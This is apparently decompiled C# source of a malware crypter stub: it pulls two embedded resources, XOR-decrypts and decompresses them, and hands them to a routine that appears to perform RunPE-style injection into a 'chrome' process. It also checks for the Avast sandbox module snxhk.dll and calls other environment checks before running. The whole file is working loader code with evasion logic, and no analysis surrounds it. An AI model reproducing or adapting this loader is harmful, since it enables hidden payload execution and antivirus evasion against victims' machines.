using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;
using ns1;

namespace ns3;

internal class Class5
{
	private static Assembly assembly_0 = Assembly.GetExecutingAssembly();

	private static ResourceManager resourceManager_0 = new ResourceManager("Hamza", assembly_0);

	private static bool bool_0 = false;

	private static bool bool_1 = false;

	private static byte[] RetFile => smethod_1(smethod_0((byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(resourceManager_0.GetObject("First")) }, (string[])null, (Type[])null, (bool[])null)));

	private static byte[] RetRpE => smethod_1(smethod_0((byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(resourceManager_0.GetObject("Second")) }, (string[])null, (Type[])null, (bool[])null)));

	[STAThread]
	public static void Main()
	{
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		if (!Class8.smethod_0() || !Class36.smethod_4())
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Process.GetCurrentProcess().Modules.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ProcessModule processModule = (ProcessModule)enumerator.Current;
					if (Operators.CompareString(processModule.ModuleName, "snxhk.dll", false) != 0)
					{
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			Class6 @class = new Class6(RetRpE, "Alternative", "Running", new object[7] { RetFile, "%ProcessName%", "", "Oui", "google ", "chrome", "chrome" });
			@class.method_0();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static byte[] smethod_0(byte[] byte_0)
	{
		void* ptr = stackalloc byte[8];
		byte[] array = new byte[checked(byte_0.Length - 16 - 1 + 1)];
		Buffer.BlockCopy(byte_0, 16, array, 0, array.Length);
		*(int*)((byte*)ptr + 4) = checked(array.Length - 1);
		*(int*)ptr = 0;
		while (*(int*)ptr <= *(int*)((byte*)ptr + 4))
		{
			array[*(int*)ptr] = (byte)(array[*(int*)ptr] ^ byte_0[*(int*)ptr % 16]);
			checked
			{
				(*unchecked((int*)ptr))++;
			}
		}
		return array;
	}

	public static byte[] smethod_1(byte[] byte_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		memoryStream.Write(byte_0, 0, byte_0.Length);
		memoryStream.Position = 0L;
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress, leaveOpen: true);
		MemoryStream memoryStream2 = new MemoryStream();
		byte[] array = new byte[64];
		int num = -1;
		for (num = gZipStream.Read(array, 0, array.Length); num > 0; num = gZipStream.Read(array, 0, array.Length))
		{
			memoryStream2.Write(array, 0, num);
		}
		gZipStream.Close();
		return memoryStream2.ToArray();
	}

	public static object smethod_2(Type type_0, string string_0, object[] object_0)
	{
		return type_0.InvokeMember(string_0, BindingFlags.InvokeMethod, null, null, object_0);
	}
}
